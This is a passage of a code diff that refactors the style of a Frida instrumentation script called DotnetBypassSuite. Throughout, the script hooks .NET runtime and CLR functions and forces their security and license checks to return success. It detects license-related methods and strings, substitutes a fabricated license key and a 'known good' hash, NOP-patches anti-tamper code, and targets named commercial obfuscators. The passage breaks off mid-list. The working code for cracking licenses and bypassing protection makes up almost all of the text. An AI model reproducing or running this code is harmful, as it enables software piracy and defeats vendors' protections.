-        var func = Module.findExportByName(this.clrModule.name, name);
-        if (func) return func;
+      const func = Module.findExportByName(this.clrModule.name, name);
+      if (func) { return func; }
 
         // Try pattern matching
-        var matches = Memory.scanSync(this.clrModule.base, this.clrModule.size, pattern);
-        if (matches.length > 0) {
+      const matches = Memory.scanSync(this.clrModule.base, this.clrModule.size, pattern);
+      if (matches.length > 0) {
             return matches[0].address;
         }
 
@@ -1119,15 +1093,13 @@ const DotnetBypassSuite = {
 
     // Helper: Hook method by name
     hookMethodByName: function (name, replacementFactory) {
-        var self = this;
-
         // Search in all loaded modules
-        Process.enumerateModules().forEach(function (module) {
-            module.enumerateExports().forEach(function (exp) {
+        Process.enumerateModules().forEach(module => {
+            module.enumerateExports().forEach(exp => {
                 if (exp.name.includes(name)) {
-                    var replacement = replacementFactory(exp.address);
-                    Interceptor.replace(exp.address, replacement);
-                    self.stats.methodsHooked++;
+                  const replacement = replacementFactory(exp.address);
+                  Interceptor.replace(exp.address, replacement);
+                    this.stats.methodsHooked++;
                     send({
                         type: 'info',
                         target: 'dotnet_bypass_suite',
@@ -1142,16 +1114,16 @@ const DotnetBypassSuite = {
     // Helper: Get method name from metadata
     getMethodName: function (methodDef) {
         try {
-            var nameRva = methodDef.add(0x8).readU32();
-            if (nameRva > 0 && nameRva < this.clrModule.size) {
+          const nameRva = methodDef.add(0x8).readU32();
+          if (nameRva > 0 && nameRva < this.clrModule.size) {
                 var namePtr = this.clrModule.base.add(nameRva);
                 return namePtr.readUtf8String();
             }
 
-            var methodTablePtr = methodDef.readPointer();
-            if (methodTablePtr && !methodTablePtr.isNull()) {
-                var methodDescPtr = methodTablePtr.add(0x10).readPointer();
-                if (methodDescPtr && !methodDescPtr.isNull()) {
+          const methodTablePtr = methodDef.readPointer();
+          if (methodTablePtr && !methodTablePtr.isNull()) {
+              const methodDescPtr = methodTablePtr.add(0x10).readPointer();
+              if (methodDescPtr && !methodDescPtr.isNull()) {
                     var namePtr = methodDescPtr.add(0x0).readPointer();
                     if (namePtr && !namePtr.isNull()) {
                         return namePtr.readUtf8String();
@@ -1173,25 +1145,25 @@ const DotnetBypassSuite = {
     },
 
     // Helper: Check if method is license-related
-    isLicenseMethod: function (name) {
-        if (!name) return false;
+    isLicenseMethod: name => {
+        if (!name) { return false; }
 
-        var keywords = [
-            'license',
-            'activation',
-            'serial',
-            'trial',
-            'expire',
-            'validate',
-            'verify',
-            'check',
-            'register',
-            'unlock',
-            'authentic',
-        ];
+      const keywords = [
+        'license',
+        'activation',
+        'serial',
+        'trial',
+        'expire',
+        'validate',
+        'verify',
+        'check',
+        'register',
+        'unlock',
+        'authentic',
+      ];
 
-        name = name.toLowerCase();
-        for (var i = 0; i < keywords.length; i++) {
+      name = name.toLowerCase();
+        for (let i = 0; i < keywords.length; i++) {
             if (name.includes(keywords[i])) {
                 return true;
             }
@@ -1201,17 +1173,17 @@ const DotnetBypassSuite = {
     },
 
     // Helper: Check if string is license-related
-    isLicenseString: function (str) {
-        if (!str || str.length < 4) return false;
+    isLicenseString: str => {
+        if (!str || str.length < 4) { return false; }
 
-        var patterns = [
-            /^[A-Z0-9]{4,}-[A-Z0-9]{4,}/,
-            /\d{4}-\d{4}-\d{4}-\d{4}/,
-            /[A-F0-9]{8}-[A-F0-9]{4}-[A-F0-9]{4}/,
-            /licen[sc]e|serial|key|activation/i,
-        ];
+      const patterns = [
+        /^[A-Z0-9]{4,}-[A-Z0-9]{4,}/,
+        /\d{4}-\d{4}-\d{4}-\d{4}/,
+        /[A-F0-9]{8}-[A-F0-9]{4}-[A-F0-9]{4}/,
+        /licen[sc]e|serial|key|activation/i,
+      ];
 
-        for (var i = 0; i < patterns.length; i++) {
+      for (let i = 0; i < patterns.length; i++) {
             if (patterns[i].test(str)) {
                 return true;
             }
@@ -1221,7 +1193,7 @@ const DotnetBypassSuite = {
     },
 
     // Helper: Generate valid license
-    generateValidLicense: function (original) {
+    generateValidLicense: original => {
         // Generate a valid-looking license based on the original format
         if (original.match(/^[A-Z0-9]{4,}-[A-Z0-9]{4,}/)) {
             return 'INTC-RACK-2024-FULL';
@@ -1235,18 +1207,18 @@ const DotnetBypassSuite = {
     },
 
     // Helper: Check if data is assembly
-    isAssemblyData: function (data, length) {
-        if (length < 64) return false;
+    isAssemblyData: (data, length) => {
+        if (length < 64) { return false; }
 
         try {
             // Check for PE header
-            var dos = data.readU16();
-            if (dos === 0x5a4d) {
+          const dos = data.readU16();
+          if (dos === 0x5a4d) {
                 // MZ
-                var peOffset = data.add(0x3c).readU32();
-                if (peOffset < length - 4) {
-                    var pe = data.add(peOffset).readU32();
-                    return pe === 0x00004550; // PE\0\0
+              const peOffset = data.add(0x3c).readU32();
+              if (peOffset < length - 4) {
+                  const pe = data.add(peOffset).readU32();
+                  return pe === 0x00004550; // PE\0\0
                 }
             }
         } catch (e) {
@@ -1264,7 +1236,7 @@ const DotnetBypassSuite = {
     },
 
     // Helper: Get known good hash
-    getKnownGoodHash: function () {
+    getKnownGoodHash: () => {
         // Return a hash that will pass validation
         return [
             0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0xba, 0xbe, 0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc,
@@ -1274,19 +1246,19 @@ const DotnetBypassSuite = {
     },
 
     // Helper: Check for known protections
-    checkForProtections: function (assembly) {
+    checkForProtections: _assembly => {
         // Check for obfuscator signatures
-        var signatures = {
-            DotfuscatorAttribute: 'Dotfuscator',
-            'SmartAssembly.Attributes': 'SmartAssembly',
-            ConfusedByAttribute: 'ConfuserEx',
-            YanoAttribute: 'Yano',
-            CryptoObfuscator: 'Crypto Obfuscator',
-            BabelAttribute: 'Babel',
-            AgileDotNetRT: 'Agile.NET',
-        };
+      const signatures = {
+        DotfuscatorAttribute: 'Dotfuscator',
+        'SmartAssembly.Attributes': 'SmartAssembly',
+        ConfusedByAttribute: 'ConfuserEx',
+        YanoAttribute: 'Yano',
+        CryptoObfuscator: 'Crypto Obfuscator',
+        BabelAttribute: 'Babel',
+        AgileDotNetRT: 'Agile.NET',
+      };
 
-        Object.keys(signatures).forEach(function (sig) {
+      Object.keys(signatures).forEach(sig => {
             // Check for attributes in metadata
             send({
                 type: 'info',
@@ -1298,7 +1270,7 @@ const DotnetBypassSuite = {
     },
 
     // Helper: Patch anti-tamper checks
-    patchAntiTamperChecks: function (assembly) {
+    patchAntiTamperChecks: assembly => {
         send({
             type: 'status',
             target: 'dotnet_bypass_suite',
@@ -1306,36 +1278,34 @@ const DotnetBypassSuite = {
         });
 
         try {
-            var assemblyPtr = assembly.readPointer();
-            if (!assemblyPtr || assemblyPtr.isNull()) {
+          const assemblyPtr = assembly.readPointer();
+          if (!assemblyPtr || assemblyPtr.isNull()) {
                 return;
             }
 
-            var antiTamperPatterns = [
-                [0x48, 0x8b, 0x05, 0x90, 0x90, 0x90, 0x90],
-                [0xe8, 0x90, 0x90, 0x90, 0x90, 0x84, 0xc0, 0x74],
-                [0x48, 0x85, 0xc0, 0x74, 0x90, 0x48, 0x8b, 0xc8],
-            ];
+          const antiTamperPatterns = [
+            [0x48, 0x8b, 0x05, 0x90, 0x90, 0x90, 0x90],
+            [0xe8, 0x90, 0x90, 0x90, 0x90, 0x84, 0xc0, 0x74],
+            [0x48, 0x85, 0xc0, 0x74, 0x90, 0x48, 0x8b, 0xc8],
+          ];
 
-            var peHeader = assemblyPtr.add(0x3c).readU32();
-            var codeSection = assemblyPtr.add(peHeader + 0x18);
-            var codeBase = codeSection.add(0x0c).readPointer();
-            var codeSize = codeSection.add(0x08).readU32();
+          const peHeader = assemblyPtr.add(0x3c).readU32();
+          const codeSection = assemblyPtr.add(peHeader + 0x18);
+          const codeBase = codeSection.add(0x0c).readPointer();
+          const codeSize = codeSection.add(0x08).readU32();
 
-            antiTamperPatterns.forEach(function (pattern) {
-                var matches = Memory.scanSync(
-                    codeBase,
-                    codeSize,
-                    pattern
-                        .map(function (b) {
-                            return b === 0x90 ? '??' : b.toString(16).padStart(2, '0');
-                        })
-                        .join(' ')
-                );
+          antiTamperPatterns.forEach(pattern => {
+              const matches = Memory.scanSync(
+                codeBase,
+                codeSize,
+                pattern
+                  .map(b => (b === 0x90 ? '??' : b.toString(16).padStart(2, '0')))
+                  .join(' ')
+              );
 
-                matches.forEach(function (match) {
-                    Memory.patchCode(match.address, pattern.length, function (code) {
-                        for (var i = 0; i < pattern.length; i++) {
+              matches.forEach(match => {
+                    Memory.patchCode(match.address, pattern.length, code => {
+                        for (let i = 0; i < pattern.length; i++) {
                             code.putU8(0x90);
                         }
                     });
@@ -1368,10 +1338,10 @@ const DotnetBypassSuite = {
         });
 
         // Get native code address
-        var nativeCode = methodInfo.add(0x20).readPointer();
-        if (nativeCode && !nativeCode.isNull()) {
+      const nativeCode = methodInfo.add(0x20).readPointer();
+      if (nativeCode && !nativeCode.isNull()) {
             // Patch to return true
-            Memory.patchCode(nativeCode, 3, function (code) {
+            Memory.patchCode(nativeCode, 3, code => {
                 code.putU8(0xb0); // mov al, 1
                 code.putU8(0x01);
                 code.putU8(0xc3); // ret
@@ -1381,13 +1351,13 @@ const DotnetBypassSuite = {
     },
 
     // Helper: Find method in vtable
-    findMethodInVTable: function (object, methodName) {
+    findMethodInVTable: (object, _methodName) => {
         // Simplified vtable search
         try {
-            var vtable = object.readPointer();
-            for (var i = 0; i < 100; i++) {
-                var method = vtable.add(i * Process.pointerSize).readPointer();
-                if (method && !method.isNull()) {
+          const vtable = object.readPointer();
+          for (let i = 0; i < 100; i++) {
+              const method = vtable.add(i * Process.pointerSize).readPointer();
+              if (method && !method.isNull()) {
                     // Would need to check method name in metadata
                     // For now, return first valid method
                     return method;
@@ -1408,22 +1378,22 @@ const DotnetBypassSuite = {
     },
 
     // Helper: Check if assembly is protected
-    isProtectedAssembly: function (filename) {
-        if (!filename) return false;
+    isProtectedAssembly: filename => {
+        if (!filename) { return false; }
 
-        var protectedNames = [
-            'license',
-            'activation',
-            'crypto',
-            'protect',
-            'obfuscat',
-            'secure',
-            'guard',
-            'shield',
-        ];
+      const protectedNames = [
+        'license',
+        'activation',
+        'crypto',
+        'protect',
+        'obfuscat',
+        'secure',
+        'guard',
+        'shield',
+      ];
 
-        filename = filename.toLowerCase();
-        for (var i = 0; i < protectedNames.length; i++) {
+      filename = filename.toLowerCase();
+        for (let i = 0; i < protectedNames.length; i++) {
             if (filename.includes(protectedNames[i])) {
                 return true;
             }
@@ -1436,24 +1406,22 @@ const DotnetBypassSuite = {
 
     // 1. .NET 9.0/10.0 Runtime Bypass
     hookDotNet9Runtime: function () {
-        var self = this;
-
         // .NET 9.0 introduces new runtime security features
-        var dotNet9Patterns = [
-            // .NET 9.0 runtime security check pattern
-            '48 8B 05 ?? ?? ?? ?? 48 85 C0 74 ?? 48 8B C8 E8 ?? ?? ?? ?? 84 C0 75',
-            // Enhanced security validation pattern
-            '49 8B CC E8 ?? ?? ?? ?? 85 C0 0F 85 ?? ?? ?? ?? 48 8B 5C 24',
-            // Modern runtime integrity verification
-            '48 89 74 24 ?? 57 48 83 EC ?? 48 8B F9 48 8B F2 E8 ?? ?? ?? ?? 84 C0',
-        ];
+      const dotNet9Patterns = [
+        // .NET 9.0 runtime security check pattern
+        '48 8B 05 ?? ?? ?? ?? 48 85 C0 74 ?? 48 8B C8 E8 ?? ?? ?? ?? 84 C0 75',
+        // Enhanced security validation pattern
+        '49 8B CC E8 ?? ?? ?? ?? 85 C0 0F 85 ?? ?? ?? ?? 48 8B 5C 24',
+        // Modern runtime integrity verification
+        '48 89 74 24 ?? 57 48 83 EC ?? 48 8B F9 48 8B F2 E8 ?? ?? ?? ?? 84 C0',
+      ];
 
-        dotNet9Patterns.forEach(function (pattern) {
-            var matches = Memory.scanSync(self.clrModule.base, self.clrModule.size, pattern);
+      dotNet9Patterns.forEach(pattern => {
+          const matches = Memory.scanSync(this.clrModule.base, this.clrModule.size, pattern);
 
-            matches.forEach(function (match) {
+          matches.forEach(match => {
                 Interceptor.attach(match.address, {
-                    onEnter: function (args) {
+                    onEnter: _args => {
                         send({
                             type: 'bypass',
                             target: 'dotnet_bypass_suite',
@@ -1461,11 +1429,11 @@ const DotnetBypassSuite = {
                             address: match.address.toString(),
                         });
                     },
-                    onLeave: function (retval) {
+                    onLeave: retval => {
                         // Force .NET 9 security checks to pass
                         if (retval.toInt32() === 0) {
                             retval.replace(1);
-                            self.stats.dotNet9RuntimeBypassEvents++;
+                            this.stats.dotNet9RuntimeBypassEvents++;
                             send({
                                 type: 'success',
                                 target: 'dotnet_bypass_suite',
@@ -1478,30 +1446,30 @@ const DotnetBypassSuite = {
         });
 
         // Hook .NET 9.0 specific AssemblyLoadContext security
-        var dotNet9AlcPattern =
-            '48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 41 54 41 55 41 56 41 57 48 83 EC ?? 4C 8B FA';
-        var alcMatches = Memory.scanSync(
-            self.clrModule.base,
-            self.clrModule.size,
-            dotNet9AlcPattern
-        );
+      const dotNet9AlcPattern =
+        '48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 41 54 41 55 41 56 41 57 48 83 EC ?? 4C 8B FA';
+      const alcMatches = Memory.scanSync(
+        this.clrModule.base,
+        this.clrModule.size,
+        dotNet9AlcPattern
+      );
 
-        alcMatches.forEach(function (match) {
+      alcMatches.forEach(match => {
             Interceptor.attach(match.address, {
-                onEnter: function (args) {
-                    var contextPtr = args[0];
-                    var assemblyPtr = args[1];
+                onEnter: args => {
+                  const _contextPtr = args[0];
+                  const _assemblyPtr = args[1];
 
-                    send({
+                  send({
                         type: 'info',
                         target: 'dotnet_bypass_suite',
                         action: 'dotnet9_assembly_load_context_intercepted',
                     });
                 },
-                onLeave: function (retval) {
+                onLeave: retval => {
                     // Ensure assembly loading succeeds
                     if (!retval.isNull()) {
-                        self.stats.dotNet9RuntimeBypassEvents++;
+                        this.stats.dotNet9RuntimeBypassEvents++;
                         send({
                             type: 'success',
                             target: 'dotnet_bypass_suite',
@@ -1517,29 +1485,27 @@ const DotnetBypassSuite = {
 
     // 2. Native AOT (Ahead-of-Time) Compilation Bypass
     hookNativeAotBypass: function () {
-        var self = this;
-
         // Native AOT produces single executable without traditional CLR
         // Look for NativeAOT runtime signatures
-        var nativeAotPatterns = [
-            // NativeAOT runtime initialization pattern
-            '48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 48 83 EC ?? 48 8D 0D',
-            // NativeAOT type system pattern
-            '48 8B 42 ?? 48 8B CA 48 89 01 48 8B 42 ?? 48 89 41 ?? C3',
-            // NativeAOT GC interaction pattern
-            '41 57 48 83 EC ?? 4C 8B F9 48 8B D1 48 8D 0D ?? ?? ?? ?? E8',
-        ];
+      const nativeAotPatterns = [
+        // NativeAOT runtime initialization pattern
+        '48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 48 83 EC ?? 48 8D 0D',
+        // NativeAOT type system pattern
+        '48 8B 42 ?? 48 8B CA 48 89 01 48 8B 42 ?? 48 89 41 ?? C3',
+        // NativeAOT GC interaction pattern
+        '41 57 48 83 EC ?? 4C 8B F9 48 8B D1 48 8D 0D ?? ?? ?? ?? E8',
+      ];
 
-        nativeAotPatterns.forEach(function (pattern) {
-            var matches = Memory.scanSync(
-                Module.getBaseAddress('ntdll.dll'),
-                Module.getSize('ntdll.dll'),
-                pattern
-            );
+      nativeAotPatterns.forEach(pattern => {
+          const matches = Memory.scanSync(
+            Module.getBaseAddress('ntdll.dll'),
+            Module.getSize('ntdll.dll'),
+            pattern
+          );
 
-            matches.forEach(function (match) {
+          matches.forEach(match => {
                 Interceptor.attach(match.address, {
-                    onEnter: function (args) {
+                    onEnter: _args => {
                         send({
                             type: 'info',
                             target: 'dotnet_bypass_suite',
@@ -1547,11 +1513,11 @@ const DotnetBypassSuite = {
                             address: match.address.toString(),
                         });
                     },
-                    onLeave: function (retval) {
+                    onLeave: retval => {
                         // Ensure Native AOT operations succeed
                         if (retval.toInt32() !== 0) {
                             retval.replace(0); // Force success
-                            self.stats.nativeAotBypassEvents++;
+                            this.stats.nativeAotBypassEvents++;
                             send({
                                 type: 'bypass',
                                 target: 'dotnet_bypass_suite',
@@ -1564,27 +1530,27 @@ const DotnetBypassSuite = {
         });
 
         // Hook NativeAOT reflection restrictions
-        var reflectionPattern = '48 8B 01 FF 50 ?? 85 C0 74 ?? 48 8B CB E8 ?? ?? ?? ?? 48 8B C8';
-        var reflectionMatches = Memory.scanSync(
-            Module.getBaseAddress('kernel32.dll'),
-            Module.getSize('kernel32.dll'),
-            reflectionPattern
-        );
+      const reflectionPattern = '48 8B 01 FF 50 ?? 85 C0 74 ?? 48 8B CB E8 ?? ?? ?? ?? 48 8B C8';
+      const reflectionMatches = Memory.scanSync(
+        Module.getBaseAddress('kernel32.dll'),
+        Module.getSize('kernel32.dll'),
+        reflectionPattern
+      );
 
-        reflectionMatches.forEach(function (match) {
+      reflectionMatches.forEach(match => {
             Interceptor.attach(match.address, {
-                onEnter: function (args) {
+                onEnter: _args => {
                     send({
                         type: 'info',
                         target: 'dotnet_bypass_suite',
                         action: 'native_aot_reflection_restriction_detected',
                     });
                 },
-                onLeave: function (retval) {
+                onLeave: retval => {
                     // Allow all reflection operations
                     if (retval.toInt32() === 0) {
                         retval.replace(1);
-                        self.stats.nativeAotBypassEvents++;
+                        this.stats.nativeAotBypassEvents++;
                         send({
                             type: 'bypass',
                             target: 'dotnet_bypass_suite',
@@ -1600,24 +1566,22 @@ const DotnetBypassSuite = {
 
     // 3. Trimming and Single-File Deployment Bypass
     hookTrimmingSingleFileBypass: function () {
-        var self = this;
-
         // Single-file deployments extract to temp directory
-        var tempExtractPattern =
-            '48 89 5C 24 ?? 48 89 74 24 ?? 57 48 83 EC ?? 48 8B F2 48 8B F9 E8 ?? ?? ?? ?? 85 C0';
-        var extractMatches = Memory.scanSync(
-            self.clrModule.base,
-            self.clrModule.size,
-            tempExtractPattern
-        );
+      const tempExtractPattern =
+        '48 89 5C 24 ?? 48 89 74 24 ?? 57 48 83 EC ?? 48 8B F2 48 8B F9 E8 ?? ?? ?? ?? 85 C0';
+      const extractMatches = Memory.scanSync(
+        this.clrModule.base,
+        this.clrModule.size,
+        tempExtractPattern
+      );
 
-        extractMatches.forEach(function (match) {
+      extractMatches.forEach(match => {
             Interceptor.attach(match.address, {
-                onEnter: function (args) {
-                    var extractPath = args[1];
-                    if (extractPath && !extractPath.isNull()) {
-                        var path = extractPath.readUtf16String();
-                        send({
+                onEnter: args => {
+                  const extractPath = args[1];
+                  if (extractPath && !extractPath.isNull()) {
+                      const path = extractPath.readUtf16String();
+                      send({
                             type: 'info',
                             target: 'dotnet_bypass_suite',
                             action: 'single_file_extraction_detected',
@@ -1625,11 +1589,11 @@ const DotnetBypassSuite = {
                         });
                     }
                 },
-                onLeave: function (retval) {
+                onLeave: retval => {
                     // Ensure extraction succeeds
                     if (retval.toInt32() !== 0) {
                         retval.replace(0);
-                        self.stats.trimmingSingleFileBypassEvents++;
+                        this.stats.trimmingSingleFileBypassEvents++;
                         send({
                             type: 'bypass',
                             target: 'dotnet_bypass_suite',
@@ -1641,28 +1605,28 @@ const DotnetBypassSuite = {
         });
 
         // Hook trimming metadata validation
-        var trimmingPattern = '48 8B 42 ?? 48 85 C0 74 ?? 48 8B 48 ?? 48 85 C9 74';
-        var trimmingMatches = Memory.scanSync(
-            self.clrModule.base,
-            self.clrModule.size,
-            trimmingPattern
-        );
+      const trimmingPattern = '48 8B 42 ?? 48 85 C0 74 ?? 48 8B 48 ?? 48 85 C9 74';
+      const trimmingMatches = Memory.scanSync(
+        this.clrModule.base,
+        this.clrModule.size,
+        trimmingPattern
+      );
 
-        trimmingMatches.forEach(function (match) {
+      trimmingMatches.forEach(match => {
             Interceptor.attach(match.address, {
-                onEnter: function (args) {
+                onEnter: _args => {
                     send({
                         type: 'info',
                         target: 'dotnet_bypass_suite',
                         action: 'trimming_metadata_validation_detected',
                     });
                 },
-                onLeave: function (retval) {
+                onLeave: retval => {
                     // Bypass trimming restrictions
                     if (retval.isNull()) {
                         // Return valid metadata pointer
                         retval.replace(ptr(0x1000));
-                        self.stats.trimmingSingleFileBypassEvents++;
+                        this.stats.trimmingSingleFileBypassEvents++;
                         send({
                             type: 'bypass',
                             target: 'dotnet_bypass_suite',
@@ -1674,21 +1638,21 @@ const DotnetBypassSuite = {
         });
 
         // Hook bundled resource access
-        var bundlePattern =
-            '48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 41 56 41 57 48 83 EC ?? 4C 8B F2';
-        var bundleMatches = Memory.scanSync(
-            self.clrModule.base,
-            self.clrModule.size,
-            bundlePattern
-        );
+      const bundlePattern =
+        '48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 41 56 41 57 48 83 EC ?? 4C 8B F2';
+      const bundleMatches = Memory.scanSync(
+        this.clrModule.base,
+        this.clrModule.size,
+        bundlePattern
+      );
 
-        bundleMatches.forEach(function (match) {
+      bundleMatches.forEach(match => {
             Interceptor.attach(match.address, {
-                onEnter: function (args) {
-                    var resourceName = args[1];
-                    if (resourceName && !resourceName.isNull()) {
-                        var name = resourceName.readUtf16String();
-                        send({
+                onEnter: args => {
+                  const resourceName = args[1];
+                  if (resourceName && !resourceName.isNull()) {
+                      const name = resourceName.readUtf16String();
+                      send({
                             type: 'info',
                             target: 'dotnet_bypass_suite',
                             action: 'bundled_resource_access_detected',
@@ -1696,12 +1660,12 @@ const DotnetBypassSuite = {
                         });
                     }
                 },
-                onLeave: function (retval) {
+                onLeave: retval => {
                     // Allow all bundled resource access
                     if (retval.isNull()) {
                         // Return success pointer
                         retval.replace(ptr(0x2000));
-                        self.stats.trimmingSingleFileBypassEvents++;
+                        this.stats.trimmingSingleFileBypassEvents++;
                     }
                 },
             });
@@ -1713,17 +1677,15 @@ const DotnetBypassSuite = {
 
     // 4. R2R (Ready-to-Run) Image Bypass
     hookReadyToRunBypass: function () {
-        var self = this;
-
         // R2R images have pre-compiled native code
-        var r2rHeaderPattern = '52 32 52 00'; // "R2R\0" signature
-        var r2rMatches = Memory.scanSync(
-            self.clrModule.base,
-            self.clrModule.size,
-            r2rHeaderPattern
-        );
+      const r2rHeaderPattern = '52 32 52 00'; // "R2R\0" signature
+      const r2rMatches = Memory.scanSync(
+        this.clrModule.base,
+        this.clrModule.size,
+        r2rHeaderPattern
+      );
 
-        r2rMatches.forEach(function (match) {
+      r2rMatches.forEach(match => {
             send({
                 type: 'info',
                 target: 'dotnet_bypass_suite',
@@ -1733,19 +1695,19 @@ const DotnetBypassSuite = {
         });
 
         // Hook R2R method resolution
-        var r2rMethodPattern =
-            '48 89 5C 24 ?? 48 89 74 24 ?? 57 48 83 EC ?? 48 8B FA 48 8B F1 E8 ?? ?? ?? ?? 48 85 C0 75';
-        var methodMatches = Memory.scanSync(
-            self.clrModule.base,
-            self.clrModule.size,
-            r2rMethodPattern
-        );
+      const r2rMethodPattern =
+        '48 89 5C 24 ?? 48 89 74 24 ?? 57 48 83 EC ?? 48 8B FA 48 8B F1 E8 ?? ?? ?? ?? 48 85 C0 75';
+      const methodMatches = Memory.scanSync(
+        this.clrModule.base,
+        this.clrModule.size,
+        r2rMethodPattern
+      );
 
-        methodMatches.forEach(function (match) {
+      methodMatches.forEach(match => {
             Interceptor.attach(match.address, {
-                onEnter: function (args) {
-                    var methodToken = args[1];
-                    if (methodToken) {
+                onEnter: args => {
+                  const methodToken = args[1];
+                  if (methodToken) {
                         send({
                             type: 'info',
                             target: 'dotnet_bypass_suite',
@@ -1754,12 +1716,12 @@ const DotnetBypassSuite = {
                         });
                     }
                 },
-                onLeave: function (retval) {
+                onLeave: retval => {
                     // Ensure R2R method resolution succeeds
                     if (retval.isNull()) {
                         // Return valid method descriptor
                         retval.replace(ptr(0x3000));
-                        self.stats.readyToRunBypassEvents++;
+                        this.stats.readyToRunBypassEvents++;
                         send({
                             type: 'bypass',
                             target: 'dotnet_bypass_suite',
@@ -1771,23 +1733,23 @@ const DotnetBypassSuite = {
         });
 
         // Hook R2R fixup processing
-        var fixupPattern = '41 56 48 83 EC ?? 4C 8B F2 48 8B D1 48 8D 0D ?? ?? ?? ?? E8';
-        var fixupMatches = Memory.scanSync(self.clrModule.base, self.clrModule.size, fixupPattern);
+      const fixupPattern = '41 56 48 83 EC ?? 4C 8B F2 48 8B D1 48 8D 0D ?? ?? ?? ?? E8';
+      const fixupMatches = Memory.scanSync(this.clrModule.base, this.clrModule.size, fixupPattern);
 
-        fixupMatches.forEach(function (match) {
+      fixupMatches.forEach(match => {
             Interceptor.attach(match.address, {
-                onEnter: function (args) {
+                onEnter: _args => {
                     send({
                         type: 'info',
                         target: 'dotnet_bypass_suite',
                         action: 'r2r_fixup_processing_detected',
                     });
                 },
-                onLeave: function (retval) {
+                onLeave: retval => {
                     // Allow all fixup operations
                     if (retval.toInt32() !== 0) {
                         retval.replace(0);
-                        self.stats.readyToRunBypassEvents++;
+                        this.stats.readyToRunBypassEvents++;
                         send({
                             type: 'bypass',
                             target: 'dotnet_bypass_suite',
@@ -1803,15 +1765,13 @@ const DotnetBypassSuite = {
 
     // 5. WASM/Blazor .NET Runtime Bypass
     hookWasmBlazorNetRuntimeBypass: function () {
-        var self = this;
-
         // Blazor WebAssembly runtime patterns
-        var blazorModules = ['mono-wasm', 'dotnet.wasm', 'blazor.boot'];
+      const blazorModules = ['mono-wasm', 'dotnet.wasm', 'blazor.boot'];
 
-        blazorModules.forEach(function (moduleName) {
+      blazorModules.forEach(moduleName => {
             try {
-                var module = Module.findBaseAddress(moduleName);
-                if (module && !module.isNull()) {
+              const module = Module.findBaseAddress(moduleName);
+              if (module && !module.isNull()) {
                     send({
                         type: 'info',
                         target: 'dotnet_bypass_suite',
@@ -1820,28 +1780,28 @@ const DotnetBypassSuite = {
                     });
 
                     // Hook Mono WebAssembly initialization
-                    var monoWasmPattern =
-                        '48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 48 83 EC ?? 48 8B F9 48 8B EA';
-                    var wasmMatches = Memory.scanSync(
-                        module,
-                        Module.getSize(moduleName),
-                        monoWasmPattern
-                    );
+                  const monoWasmPattern =
+                    '48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 48 83 EC ?? 48 8B F9 48 8B EA';
+                  const wasmMatches = Memory.scanSync(
+                    module,
+                    Module.getSize(moduleName),
+                    monoWasmPattern
+                  );
 
-                    wasmMatches.forEach(function (match) {
+                  wasmMatches.forEach(match => {
                         Interceptor.attach(match.address, {
-                            onEnter: function (args) {
+                            onEnter: _args => {
                                 send({
                                     type: 'info',
                                     target: 'dotnet_bypass_suite',
                                     action: 'mono_wasm_init_detected',
                                 });
                             },
-                            onLeave: function (retval) {
+                            onLeave: retval => {
                                 // Ensure WASM initialization succeeds
                                 if (retval.toInt32() !== 0) {
                                     retval.replace(0);
-                                    self.stats.wasmBlazorNetRuntimeBypassEvents++;
+                                    this.stats.wasmBlazorNetRuntimeBypassEvents++;
                                     send({
                                         type: 'bypass',
                                         target: 'dotnet_bypass_suite',
@@ -1866,16 +1826,16 @@ const DotnetBypassSuite = {
         });
 
         // Hook JavaScript interop security
-        var jsInteropPattern = 'JS_Call';
-        try {
-            var jsCall = Module.findExportByName(null, jsInteropPattern);
-            if (jsCall) {
+      const jsInteropPattern = 'JS_Call';
+      try {
+          const jsCall = Module.findExportByName(null, jsInteropPattern);
+          if (jsCall) {
                 Interceptor.attach(jsCall, {
-                    onEnter: function (args) {
-                        var functionName = args[1];
-                        if (functionName && !functionName.isNull()) {
-                            var name = functionName.readUtf8String();
-                            send({
+                    onEnter: args => {
+                      const functionName = args[1];
+                      if (functionName && !functionName.isNull()) {
+                          const name = functionName.readUtf8String();
+                          send({
                                 type: 'info',
                                 target: 'dotnet_bypass_suite',
                                 action: 'js_interop_call_detected',
@@ -1883,11 +1843,11 @@ const DotnetBypassSuite = {
                             });
                         }
                     },
-                    onLeave: function (retval) {
+                    onLeave: retval => {
                         // Allow all JS interop calls
                         if (retval.toInt32() !== 0) {
                             retval.replace(0);
-                            self.stats.wasmBlazorNetRuntimeBypassEvents++;
+                            this.stats.wasmBlazorNetRuntimeBypassEvents++;
                         }
                     },
                 });
@@ -1905,12 +1865,12 @@ const DotnetBypassSuite = {
         }
 
         // Hook Blazor component security restrictions
-        var componentPattern = 'blazor_component_';
-        Process.enumerateModules().forEach(function (module) {
-            module.enumerateExports().forEach(function (exp) {
+      const componentPattern = 'blazor_component_';
+      Process.enumerateModules().forEach(module => {
+            module.enumerateExports().forEach(exp => {
                 if (exp.name.includes(componentPattern)) {
                     Interceptor.attach(exp.address, {
-                        onEnter: function (args) {
+                        onEnter: _args => {
                             send({
                                 type: 'info',
                                 target: 'dotnet_bypass_suite',
@@ -1918,15 +1878,15 @@ const DotnetBypassSuite = {
                                 export_name: exp.name,
                             });
                         },
-                        onLeave: function (retval) {
+                        onLeave: retval => {
                             // Bypass component security
                             if (retval.toInt32() === 0) {
                                 retval.replace(1);
-                                self.stats.wasmBlazorNetRuntimeBypassEvents++;
+                                this.stats.wasmBlazorNetRuntimeBypassEvents++;
                             }
                         },
                     });
-                    self.stats.methodsHooked++;
+                    this.stats.methodsHooked++;
                 }
             });
         });
@@ -1934,21 +1894,19 @@ const DotnetBypassSuite = {
 
     // 6. Modern Obfuscator Support (DNGuard, .NET Reactor v6, Themida .NET)
     hookModernObfuscatorSupport: function () {
-        var self = this;
-
         // DNGuard HVM patterns
-        var dnguardPatterns = [
-            'DNGuard',
-            'HVM',
-            'DNG_',
